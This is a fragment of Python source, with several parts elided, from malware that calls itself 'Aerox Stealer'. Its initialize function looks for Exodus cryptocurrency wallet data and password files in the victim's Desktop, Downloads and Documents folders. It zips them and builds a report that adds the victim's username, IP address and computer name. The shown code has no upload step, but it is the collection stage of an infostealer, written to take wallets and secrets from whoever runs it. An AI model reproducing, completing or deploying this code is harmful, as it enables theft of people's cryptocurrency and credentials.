...
def initialize():
    ...
    message = "Thanks for using Aerox Stealer 🧬\n\n[🧟]  +1 Wallet Exodus from " + username +" %FLAG%\n"
    exodus_exist = False
    if os.path.exists(path) or os.path.exists(exodus_pswd_file) or os.path.exists(exodus_pswd_file_dwnload) or os.path.exists(exodus_pswd_file_document):
        ...
        with ZipFile(zip, "w") as newzip:
            ...
            try:
                ...
                message = message + f"\n[🚀]  Exodus Files has been added"
            try:
                newzip.write(exodus_pswd_file)
                message = message + f"\n\n[🚀]  Interesting Files in Desktop directory has been added "
            except:
                pass
            try:
                newzip.write(exodus_pswd_file_dwnload)
                message = message + f"\n\n[🚀]  Interesting Files in Download directory has been added "
            except:
                pass
            try:
                newzip.write(exodus_pswd_file_document)
                message = message + f"\n\n[🚀]  Interesting Files in Document directory has been added "
            except:
                pass
    if exodus_exist:
        ...
        message = message + adressip + computer
        countryflag_list = []
